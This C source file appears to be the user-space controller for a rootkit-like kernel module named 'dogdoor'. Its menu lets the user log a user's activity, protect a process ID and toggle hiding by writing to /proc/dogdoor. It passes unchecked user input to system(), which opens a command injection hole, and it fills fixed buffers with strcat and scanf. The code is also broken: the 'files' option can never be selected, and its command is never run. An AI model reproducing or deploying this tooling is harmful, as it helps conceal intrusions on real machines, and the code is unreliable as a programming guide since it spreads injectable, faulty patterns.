#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#define _CRT_SECURE_NO_WARNINGS

int mselect(); // files, protect, hide, status, exit, others(help)
void print_help();
int main() {
	int type;
	char pid[50] = "";
	char u_name[50] = "";
//    const char* PROC_PATH = "/proc/dogdoor";
    const char* command_echo1 = "exec echo ";
    const char* command_echo2 = " > /proc/dogdoor";
    bool hiding = false;
    while(1) {
        type = mselect();
        char command[70] = "";
        if(type == 5) break;
        switch(type) {
        case 1: {
		printf("user_name: ");
		scanf("%s",u_name);
		struct passwd* user_pw;
		user_pw = getpwnam(u_name);
		int u_id = user_pw->pw_uid;
		char u_id_str[20];
// 		itoa(u_id,u_id_str,10);
		sprintf(u_id_str, "%d", u_id);
		printf("%s\n",u_id_str);
		strcat(command,command_echo1);
		strcat(command,"u");
		strcat(command,u_id_str);
		strcat(command,command_echo2);
            break;
        }
        case 2: {
            printf("pid: ");
            scanf("%s",pid);
            strcat(command,command_echo1);
            strcat(command,pid);
            strcat(command,command_echo2);
//            printf("%s\n",command);

            system(command); //execute echo command
            break;
        }
        case 3: {
            if(hiding) {
                printf("hiding: on -> off\n");
            } else {
                printf("hiding: off -> on!\n");
            }
            strcat(command,command_echo1);
            strcat(command,"o");
            strcat(command,command_echo2);
            system(command);
            hiding = !hiding;
            break;
        }
        case 4: {
		printf("log user name: %s\n",u_name);
            printf("protected pid: %s\n",pid);
            printf("hiding : %s\n", hiding? "true" : "false");
            break;
        }
        default: {
            print_help();
            break;
        } }
    }
	
	return 0;
}

int mselect() {
	printf("Enter: ");
	int type;
	char in[128] = "";
	scanf("%s",in);
	if((strcmp(in,"fils")) == 0)
		return 1;
	else if((strcmp(in,"protect")) == 0)
		return 2;
	else if((strcmp(in,"hide")) == 0)
		return 3;
	else if((strcmp(in,"status")) == 0)
		return 4;
	else if((strcmp(in,"exit")) == 0)
		return 5;
	else
		return -1;
	return -1;
}
void print_help() {
    printf("#####Options#####\n");
    printf("files\n");
    printf("protect\n");
    printf("hide\n");
    printf("status\n");
    printf("exit\n");
    printf("################\n\n");
}
